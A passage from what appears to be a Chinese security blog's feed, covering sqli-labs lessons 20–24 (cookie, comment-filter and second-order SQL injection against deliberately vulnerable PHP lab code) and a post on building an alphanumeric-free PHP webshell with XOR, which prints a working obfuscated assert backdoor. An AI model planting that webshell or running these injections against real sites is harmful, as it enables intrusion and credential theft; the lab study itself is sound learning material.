class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;Cookie:&apos;.$cookee.&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>通过阅读对应的PHP代码后发现先将cookie的值进行base64加密然后在赋予cookie，然后到处理cookie的时候解密对应的base64编码，带入数据库查询。中途没有做任何过滤，那么就给了注入的机会。<br>解密cookie的值发现为admin，然后尝试带入‘，并且base64编码带入查询</p><p><img src="https://s2.ax1x.com/2019/01/19/kCZUwF.png" alt="kCZUwF.png"></p><p>报错注入带走</p><p><img src="https://s2.ax1x.com/2019/01/19/kCZYLT.png" alt="kCZYLT.png"></p><p>二十二关是一样的，只是将’改为了“<br><img src="https://s2.ax1x.com/2019/01/19/kCZrS1.md.png" alt="kCZrS1.md.png"></p><p>第二十三关：<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-23 **Error Based- no comments**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">//filter the comments out so as to comments should not work</span><br><span class="line">$reg = &quot;/#/&quot;;</span><br><span class="line">$reg1 = &quot;/--/&quot;;</span><br><span class="line">$replace = &quot;&quot;;</span><br><span class="line">$id = preg_replace($reg, $replace, $id); /*正则替换*/</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-23.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>阅读代码后发现，注释符都给过滤掉了。那么只能手动闭合了<br>and ‘1’=’1<br><img src="https://s2.ax1x.com/2019/01/19/kCZolt.png" alt="kCZolt.png"></p><p>第二十四关：<br>代码过多，这里就不放出来了。就指出关键在哪吧<br><img src="https://s2.ax1x.com/2019/01/19/kCeOu6.png" alt="kCeOu6.png"><br>图中的所指的没有做任何过滤就带入数据库更新<br>那么可能是修改密码处，出现了问题。尝试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注册了三个账号，一个叫haq520 密码为：haq520</span><br><span class="line">一个叫：haq520&apos; 密码为：haq520!</span><br><span class="line">一个叫：haq520&apos;# 密码为：haq5201314!</span><br></pre></td></tr></table></figure></p><p>第一个登陆成功<br><img src="https://s2.ax1x.com/2019/01/19/kCmK8s.md.png" alt="kCmK8s.md.png"><br>尝试修改密码没有任何问题</p><p>第二个<br><img src="https://s2.ax1x.com/2019/01/19/kCmBKx.md.png" alt="kCmBKx.md.png"><br>尝试修改密码，出现异常<br><img src="https://s2.ax1x.com/2019/01/19/kCm6aD.png" alt="kCm6aD.png"></p><p>第三个<br><img src="https://s2.ax1x.com/2019/01/19/kCmfxI.png" alt="kCmfxI.png"><br>尝试修改密码<br><img src="https://s2.ax1x.com/2019/01/19/kCmIqf.png" alt="kCmIqf.png"><br>密码更新成功</p><p>尝试登陆第一个账号，发现密码已经被改成admin了<br><img src="https://s2.ax1x.com/2019/01/19/kCm7dS.md.png" alt="kCm7dS.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/19/kCmqiQ.png" alt="kCmqiQ.png"></p><p><img src="https://s2.ax1x.com/2019/01/19/kCmLGj.md.png" alt="kCmLGj.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/19/kCmORs.png" alt="kCmORs.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过这个例子我们逆向猜测出，现实可能也有这种情况。</span><br><span class="line">所以在挖洞的时候可以进行一定的测试</span><br></pre></td></tr></table></figure><p>世界上所有的不利，都是由当事人的能力不足所造成 《金木研》</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>No character shell study</title>
      <link href="/posts/390d804c.html"/>
      <url>/posts/390d804c.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博文是看了<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">无字母数字Webshell之提高篇 - FreeBuf互联网安全新媒体平台</a>，进行了一定的研究然后对异或进行了研究，从一开始的懵懵逼逼到后面的总结。<br><img src="https://truth.bahamut.com.tw/s01/201711/408f46a15ffa133d0a5e418dfb2d0b2e.JPG" alt="408f46a15ffa133d0a5e418dfb2d0b2e.JPG"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先说说什么的异或吧，比如说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;A&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果是~，为什么是 ~（懵逼）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">异或过程:</span><br><span class="line">先将异或的两个字符串转换为ASCII码</span><br><span class="line">A的ASCII:65</span><br><span class="line">?的ASCII:63</span><br><span class="line"></span><br><span class="line">寻找对应的二进制:</span><br><span class="line">ASCII码65的二进制为:0100 0001</span><br><span class="line">ASCII嘛63的二进制位:0011 1111</span><br><span class="line"></span><br><span class="line">异或过程，1碰0位1,0碰1为1，其他为0</span><br><span class="line">0100 0001</span><br><span class="line">0011 1111</span><br><span class="line">0111 1110</span><br><span class="line"></span><br><span class="line">结果为:01111110</span><br><span class="line"></span><br><span class="line">寻找对应的ASCII码:</span><br><span class="line">对应的ASCII码为:126</span><br><span class="line">对应的字符串为:~</span><br><span class="line"></span><br><span class="line">然后我们就得到了异或的整一个过程:</span><br><span class="line">字符串-&gt;ASCII-&gt;二进制-&gt;二进制异或的结果-&gt;ASCII码-&gt;字符串</span><br></pre></td></tr></table></figure><p>然后实现一个马子 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_0=(&quot;!&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;%&quot;^&quot;@&quot;).(&quot;2&quot;^&quot;@&quot;).(&quot;4&quot;^&quot;@&quot;); /*assert*/</span><br><span class="line">$_1=&apos;_&apos;.(hex2bin(&quot;10&quot;)^&quot;@&quot;).(hex2bin(&quot;0F&quot;)^&quot;@&quot;).(hex2bin(&quot;13&quot;)^&quot;@&quot;).(hex2bin(&quot;14&quot;)^&quot;@&quot;);</span><br><span class="line">$_2=$$_1;</span><br><span class="line">$_0($_2[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/18/k9uds0.png" alt="k9uds0.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Secondary injection of sql injection</title>
      <link href="/posts/52a98084.html"/>
      <url>/posts/52a98084.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天看了Web安全攻防这本书的SQL cookie注入那里，如果书上提供的那个测试地址失效了。还好今天的Sqli-labss第二十关。<br><img src="http://p1.qhimgs4.com/bdr/640__/t019e2c9a650b6e85ec.jpg" alt="t019e2c9a650b6e85ec.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我们先打开sqli-labs第二十关的代码仔细审计一遍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;); /*包含该php文件*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_COOKIE[&apos;uname&apos;])) /*如果变量不存在则执行*/</span><br><span class="line">&#123;</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;div style=&apos; margin-top:20px;color:#FFF; font-size:24px; text-align:center&apos;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&apos;#FF0000&apos;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div  align=&apos;center&apos; style=&apos;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&apos;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div style=&apos;padding-top:10px; font-size:15px;&apos;&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">echo &quot;&lt;!--Form to post the contents --&gt;&quot;;</span><br><span class="line">echo &apos;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;;</span><br><span class="line">echo &apos;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&apos;;</span><br><span class="line">  </span><br><span class="line">echo &apos; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&apos;;</span><br><span class="line">echo &apos;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&apos;;</span><br><span class="line">echo &apos;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">echo &apos;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value)) /*如果变量不为空*/</span><br><span class="line">&#123;</span><br><span class="line">$value = substr($value,0,20); // truncation (see comments) /*从0的位置开始读取，长度为20*/</span><br><span class="line">&#125;</span><br><span class="line">if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启magic_quotes*/</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value); /*反引用一个引用字符串*/</span><br><span class="line">&#125;</span><br><span class="line">if (!ctype_digit($value))   // Quote if not a number /*纯数字检查*/</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value); /*取整数*/</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) /*判断uname和passwd是否存在*/</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">$uname = check_input($_POST[&apos;uname&apos;]); /*调用check_input过滤变量*/</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">$result1 = mysql_query($sql); /*查询数据库*/</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">$cookee = $row1[&apos;username&apos;];</span><br><span class="line">if($row1)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">setcookie(&apos;uname&apos;, $cookee, time()+3600);</span><br><span class="line">header (&apos;Location: index.php&apos;);</span><br><span class="line">echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;;</span><br><span class="line">//echo &apos;Your Cookie is: &apos; .$cookee;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;</span><br><span class="line">//echo &quot;Try again looser&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">echo &apos;&lt;/font&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;submit&apos;])) /*如果submit不存在*/</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">$cookee = $_COOKIE[&apos;uname&apos;];</span><br><span class="line">$format = &apos;D d M Y - H:i:s&apos;;</span><br><span class="line">$timestamp = time() + 3600;</span><br><span class="line">echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&apos;;</span><br><span class="line">echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&apos;;</span><br><span class="line">echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&apos;;</span><br><span class="line">echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;orange&quot; font size = 5 &gt;&apos;;</span><br><span class="line">echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">if (!$result)</span><br><span class="line">  &#123;</span><br><span class="line">  die(&apos;Issue with your mysql: &apos; . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&apos;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&apos;;  </span><br><span class="line">echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your ID:&apos; .$row[&apos;id&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">//echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font 